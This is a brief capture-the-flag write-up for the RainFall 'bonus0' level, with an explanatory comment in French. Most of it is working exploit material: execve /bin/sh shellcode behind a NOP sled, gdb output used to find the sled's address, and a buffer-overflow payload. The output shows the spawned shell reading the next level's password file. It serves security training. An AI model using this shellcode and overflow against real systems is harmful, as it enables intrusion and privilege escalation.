```
export SHELLCODE=$(python -c "print '\x90'*500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

```
```
bonus0@RainFall:~$ gdb -q bonus0 
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/1000s environ 
0xbffff5bc:     "\364\36 ....................
...........................

0xbffff6db:     "/home/user/bonus0/bonus0"
0xbffff6f4:     "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
.....
0xbffff884:     "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
0xbffff908:      "SHELL=/bin/bash"
 ```
<!-- Tu prends une des addresses dans le nopsled (instruction 0x90, ici \220 jsp pourquoi) et tu la donnes en argument pour quand ca overflow pour que ca appelle dans ce code et que apres ca execue ton code a la fin: 20\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀ -->

we take an address in the nopsled between `0xbffff6db` and `0xbffff908`
and it will slide to the shelcode 

```
bonus0@RainFall:~$ (python -c "print 'A'*20"; python -c "print 'A'*9 + '\xbf\xff\xf8\xb9'[::-1] + 'A'*20"; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```